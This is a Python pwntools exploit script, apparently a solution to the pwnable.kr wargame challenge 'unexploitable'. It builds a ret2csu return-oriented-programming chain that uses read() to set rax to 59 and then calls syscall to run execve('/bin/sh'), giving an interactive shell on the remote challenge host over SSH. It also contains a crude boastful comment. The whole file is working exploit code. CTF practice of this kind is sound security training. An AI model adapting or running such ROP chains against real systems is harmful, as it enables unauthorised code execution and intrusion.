#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
import time
from pwn import *
#context.log_level = 'debug'


elf = ELF('./unexploitable')

# Mem locations
dynamic_fini = 0x600e78

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
__libc_csu_init1 = __libc_csu_init + 80
__libc_csu_init2 = __libc_csu_init + 102
ret              = 0x400417  # for stack alignment
syscall          = 0x400560

# Byte sequence alias
A8 = 8 * b'A'


def uROP(addr, arg1, arg2, arg3, should_align=False) -> bytes:
    """
    Returns an ROP chain to call a function
    :param addr: the address of the function
    :param arg1: edi
    :param arg2: rsi
    :param arg3: rdx
    :param should_align: align the stack before returning to `addr`?
    :return: a sequence of bytes
    """
    payload  = p64(__libc_csu_init2)    # ret2csu
    payload += A8                       # dummy (這題的 csu 比較特別)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(dynamic_fini)        # r12
    payload += p64(arg1)                # r13 -> edi
    payload += p64(arg2)                # r14 -> rsi
    payload += p64(arg3)                # r15 -> rdx
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini
    payload += 7 * A8                   # padding
    if should_align:
        payload += p64(ret)             # ret (stack alignment)
    payload += p64(addr)                # ret
    return payload



def main():
    """
    Main idea: call sys_execve("/bin/sh", NULL, NULL).

    read(0, buf, 59) -> rax will be 59
    mov edi, buf
    mov rsi, 0
    mov rdx, 0
    syscall
    """
    remote = ssh(host="pwnable.kr", user="unexploitable", password="guest", port=2222)
    proc = remote.process('/home/unexploitable/unexploitable')

    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()
    time.sleep(3)
    payload  = A8 * 3
    payload += uROP(elf.symbols['read'], 0, elf.bss(), 59, True)
    payload += uROP(syscall, elf.bss(), 0, 0)
    proc.send(payload)

    # Write b'/bin/sh\x00' to elf.bss()
    time.sleep(0.5)
    proc.send(b'/bin/sh'.ljust(59, b'\x00'))

    # I'm your god, bitch
    proc.interactive()


if __name__ == '__main__':
    main()
